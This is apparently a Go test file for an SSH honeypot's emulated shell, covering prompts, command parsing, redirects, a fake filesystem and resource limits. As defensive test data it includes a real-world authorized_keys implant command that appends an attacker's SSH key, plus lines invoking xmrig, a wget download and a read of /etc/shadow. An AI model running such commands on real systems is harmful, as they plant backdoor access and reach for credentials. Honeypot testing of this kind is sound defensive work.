package ssh

import (
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func newTestShell(user string) *Shell {
	sh := NewShell(Personas[0], user)
	sh.Now = func() time.Time { return time.Date(2026, 10, 18, 20, 37, 0, 0, time.UTC) }
	return sh
}

func TestShellBasics(t *testing.T) {
	sh := newTestShell("root")
	require.Equal(t, "root@ubuntu:~# ", sh.Prompt())
	require.Equal(t, Result{Output: "root\n", Status: StatusOK}, sh.Run("whoami"))
	require.Equal(t, "uid=0(root) gid=0(root) groups=0(root)\n", sh.Run("id").Output)
	require.Equal(t, "Linux ubuntu 5.15.0-107-generic #117-Ubuntu SMP Fri Apr 26 12:26:49 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\n", sh.Run("uname -a").Output)
	require.Equal(t, "x86_64\n", sh.Run("uname -m").Output)
	require.Equal(t, "Sun Oct 18 20:37:00 UTC 2026\n", sh.Run("date").Output)
}

func TestShellCompound(t *testing.T) {
	sh := newTestShell("root")
	res := sh.Run("cd /tmp && pwd; echo 'a b' > /tmp/x; echo hi")
	require.Equal(t, "/tmp\nhi\n", res.Output)
	require.Equal(t, "root@ubuntu:/tmp# ", sh.Prompt())
	require.Equal(t, "/root\n", sh.Run("cd; pwd").Output)
	require.Equal(t, "bash: cd: /nowhere: No such file or directory\n", sh.Run("cd /nowhere").Output)
	// a pipeline runs only its first command
	require.Equal(t, "Linux\n", sh.Run("uname | grep Linux | wc -l").Output)
	// quoted separators do not split
	require.Equal(t, "a;b\n", sh.Run(`echo "a;b"`).Output)
}

func TestShellUnknownAndExit(t *testing.T) {
	sh := newTestShell("pi")
	res := sh.Run("xmrig --donate")
	require.Equal(t, Result{Output: "bash: xmrig: command not found\n", Status: StatusNotFound, Code: 127}, res)
	require.True(t, sh.Run("ls; exit").Exit)
	require.Equal(t, "pi@ubuntu:~$ ", sh.Prompt())
	require.Equal(t, "wget: unable to resolve host address\n", sh.Run("sudo wget http://198.51.100.9/a").Output)
	require.Equal(t, "cat: /etc/shadow: No such file or directory\n", sh.Run("cat /etc/shadow").Output)
}

func TestShellFiles(t *testing.T) {
	for _, p := range Personas {
		sh := NewShell(p, "root")
		require.Contains(t, sh.Run("cat /etc/os-release").Output, `PRETTY_NAME="`+p.Pretty+`"`, p.Name)
		require.Equal(t, p.Hostname+"\n", sh.Run("hostname").Output, p.Name)
		require.Contains(t, sh.Run("cat /proc/cpuinfo").Output, p.CPU, p.Name)
	}
}

func TestLineEditor(t *testing.T) {
	var e LineEditor
	feed := func(s string) (lines []string) {
		for i := 0; i < len(s); i++ {
			if k := e.Feed(s[i]); k.Done {
				lines = append(lines, k.Line)
			}
		}
		return lines
	}
	require.Equal(t, []string{"ls -l", "pwd"}, feed("ls -l\r\npwd\n"))
	require.Equal(t, []string{"ab"}, feed("abc\x7f\r"))
	require.Equal(t, []string{"ls"}, feed("l\x1b[As\r"))
	require.Equal(t, []string{""}, feed("junk\x03"))
	require.True(t, e.Feed(0x04).EOF)

	long := make([]byte, MaxLine+10)
	for i := range long {
		long[i] = 'a'
	}
	var k Key
	for _, b := range append(long, '\r') {
		k = e.Feed(b)
	}
	require.True(t, k.Truncated)
	require.Len(t, k.Line, MaxLine)
}

// the command line of the authorized_keys implant seen in the wild
const implant = `uname -a && nproc && sh -c 'cd ~ && \
mkdir -p .ssh && \
chattr -i .ssh 2>/dev/null || true && \
cd .ssh && \
chattr -i authorized_keys 2>/dev/null || true && \
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE $(whoami)@$(hostname)" >> authorized_keys && \
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'`

func TestShellImplant(t *testing.T) {
	sh := newTestShell("kafei")
	res := sh.Run(implant)
	require.Equal(t, StatusOK, res.Status)
	require.Zero(t, res.Code)
	require.True(t, strings.HasPrefix(res.Output, "Linux ubuntu 5.15.0-107-generic"), res.Output)
	require.Contains(t, res.Output, "\n4\n")
	require.Equal(t, []FileWrite{{
		Path:   "/home/kafei/.ssh/authorized_keys",
		Data:   []byte("ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE kafei@ubuntu\n"),
		Append: true,
	}}, res.Writes)

	require.Equal(t, "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE kafei@ubuntu\n", sh.Run("cat ~/.ssh/authorized_keys").Output)
	ls := sh.Run("ls -la ~/.ssh").Output
	require.Contains(t, ls, "drwx------ 2 kafei kafei  4096 Oct 18 20:37 .\n")
	require.Contains(t, ls, "-rw------- 1 kafei kafei    58 Oct 18 20:37 authorized_keys\n")
	require.Equal(t, "", sh.Run("ls ~").Output, "dot files stay hidden")
	require.Equal(t, ".  ..  .ssh\n", sh.Run("ls -a ~").Output)
}

func TestShellShortCircuit(t *testing.T) {
	sh := newTestShell("root")
	require.Equal(t, "yes\n", sh.Run("false && echo no; true || echo no; false || echo yes").Output)
	res := sh.Run("nope && echo x")
	require.Equal(t, Result{Output: "bash: nope: command not found\n", Status: StatusNotFound, Code: 127}, res)
	require.Equal(t, "ok\n", sh.Run("mkdir /tmp/a &&\n echo ok").Output)
	require.Equal(t, "x\n", sh.Run("echo x # not this").Output)
	require.Equal(t, "a;b # c\n", sh.Run(`echo "a;b # c"`).Output)
	require.Equal(t, "", sh.Run("sleep 1 &").Output)
}

func TestShellSubstitutionAndRedirects(t *testing.T) {
	sh := newTestShell("root")
	require.Equal(t, "root@ubuntu\n", sh.Run("echo $(whoami)@`hostname`").Output)
	require.Equal(t, "$(id)\n", sh.Run("echo '$(id)'").Output)
	require.Equal(t, "AB\n", sh.Run(`echo -e "\x41\x42"`).Output)
	require.Equal(t, "AB", sh.Run(`echo -ne "\x41\x42" > /tmp/f; cat /tmp/f`).Output)
	require.Equal(t, "", sh.Run("nope 2>/dev/null").Output)
	require.Equal(t, "bash: nope: command not found\n", sh.Run("nope 2>&1").Output)
	require.Equal(t, "", sh.Run("echo hi > /dev/null").Output)
	require.Equal(t, "bash: /nowhere/f: No such file or directory\n", sh.Run("echo hi > /nowhere/f").Output)
	require.Equal(t, 1, sh.Run("echo hi > /nowhere/f").Code)
	require.Equal(t, "line 1\nline 2\n", sh.Run("echo line 1 > /tmp/g; echo line 2 >> /tmp/g; cat /tmp/g").Output)
}

func TestShellFilesystem(t *testing.T) {
	sh := newTestShell("root")
	require.Equal(t, "mkdir: cannot create directory '/tmp': File exists\n", sh.Run("mkdir /tmp").Output)
	require.Equal(t, "mkdir: cannot create directory '/x/y': No such file or directory\n", sh.Run("mkdir /x/y").Output)
	require.Equal(t, "", sh.Run("mkdir -p /x/y/z; touch /x/y/z/f").Output)
	require.Equal(t, "f\n", sh.Run("ls /x/y/z").Output)
	require.Equal(t, "rm: cannot remove '/x': Is a directory\n", sh.Run("rm /x").Output)
	require.Equal(t, "", sh.Run("rm -rf /x; rm -f /nothing").Output)
	require.Equal(t, "ls: cannot access '/x': No such file or directory\n", sh.Run("ls /x").Output)
	require.Equal(t, "rm: cannot remove '/nothing': No such file or directory\n", sh.Run("rm /nothing").Output)
	require.Equal(t, "chmod: cannot access 'nothing': No such file or directory\n", sh.Run("chmod +x nothing").Output)
	require.Equal(t, "-rwxr-xr-x 1 root root     0 Oct 18 20:37 f\n", sh.Run("touch f; chmod +x f; ls -l f").Output)
	require.Equal(t, "", sh.Run("rm /etc/hostname; cat /etc/hostname 2>/dev/null").Output)
	require.Equal(t, "ls: cannot access 'x': No such file or directory\n", sh.Run("cd /tmp; ls x").Output)
}

// A script the client wrote runs in the emulated shell, and a script that
// runs itself is stopped.
func TestShellScriptsAndLimits(t *testing.T) {
	sh := newTestShell("root")
	require.Equal(t, "hi\n", sh.Run("echo 'echo hi' > /tmp/a.sh; sh /tmp/a.sh").Output)
	require.Equal(t, "hi\n", sh.Run("chmod +x /tmp/a.sh; /tmp/a.sh").Output)
	require.Equal(t, "bash: /tmp/none: No such file or directory\n", sh.Run("/tmp/none").Output)
	require.Equal(t, "sh: 0: cannot open /tmp/none: No such file\n", sh.Run("sh /tmp/none").Output)
	require.Equal(t, "", sh.Run("sh").Output)

	res := sh.Run("echo 'sh /tmp/loop; sh /tmp/loop' > /tmp/loop; sh /tmp/loop")
	require.Contains(t, res.Output, "retry: Resource temporarily unavailable")
	require.False(t, res.Exit)
	require.True(t, sh.Run("sh -c 'exit 5'; exit").Exit)
	require.Equal(t, 5, sh.Run("sh -c 'exit 5'").Code)
	require.False(t, sh.Run("sh -c 'exit 5'").Exit, "exit leaves only the subshell")

	// the filesystem is capped
	big := strings.Repeat("a", 5000)
	var line strings.Builder
	for i := 0; i < 20; i++ {
		line.WriteString("echo " + big + " >> /tmp/big; ")
	}
	res = sh.Run(line.String())
	require.Contains(t, res.Output, "No space left on device")
	total := 0
	for _, w := range res.Writes {
		total += len(w.Data)
	}
	require.LessOrEqual(t, total, MaxFSBytes)
}

// Sessions of one connection share the files and keep their own directory.
func TestShellSessionsShareFiles(t *testing.T) {
	first := newTestShell("root")
	second := first.Session()
	first.Run("echo x > /tmp/shared; cd /tmp")
	require.Equal(t, "x\n", second.Run("cat /tmp/shared").Output)
	require.Equal(t, "/root\n", second.Run("pwd").Output)
	require.Equal(t, "/tmp\n", first.Run("pwd").Output)
}
